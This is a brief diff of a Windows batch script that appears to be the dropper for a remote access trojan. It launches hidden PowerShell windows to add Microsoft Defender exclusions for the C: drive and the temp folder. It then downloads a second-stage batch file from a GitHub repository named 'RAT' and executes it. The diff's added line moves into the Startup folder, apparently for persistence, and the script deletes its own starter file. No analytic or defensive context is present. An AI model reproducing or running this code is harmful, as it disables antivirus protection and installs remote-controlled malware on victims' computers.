@@ -30,4 +30,5 @@ powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "C
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
 curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
 powershell ./secondary.bat
+cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 del Starter.bat
